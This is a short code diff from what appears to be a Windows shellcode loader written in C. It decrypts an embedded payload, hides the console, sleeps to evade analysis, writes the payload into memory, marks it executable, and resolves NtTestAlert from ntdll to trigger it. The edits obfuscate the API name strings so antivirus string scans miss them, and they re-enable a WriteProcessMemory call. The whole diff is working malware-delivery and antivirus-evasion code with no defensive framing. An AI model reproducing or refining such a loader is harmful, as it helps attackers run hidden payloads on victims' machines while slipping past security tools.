@@ -71,7 +71,7 @@ int main()
         
       
 	FreeConsole();
-	Random6 Random7 = (Random6)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
+	Random6 Random7 = (Random6)(GetProcAddress(GetModuleHandleA(sntdll), sNtA));
 	SIZE_T Random4 = sizeof(Random3);
 	
 	Random1((char *) Random3, Random3_len, Random2, sizeof(Random2));
@@ -80,7 +80,7 @@ int main()
 	
 	SleepShort(3000);
 	
-	//WriteProcessMemory(GetCurrentProcess(), Random5, Random3, Random4, NULL);
+	WriteProcessMemory(GetCurrentProcess(), Random5, Random3, Random4, NULL);
 	RtlCopyMemory(Random5, Random3, Random3_len);
 	
 	VirtualProtect(Random5, Random3_len, PAGE_EXECUTE_READ, &oldprotect);
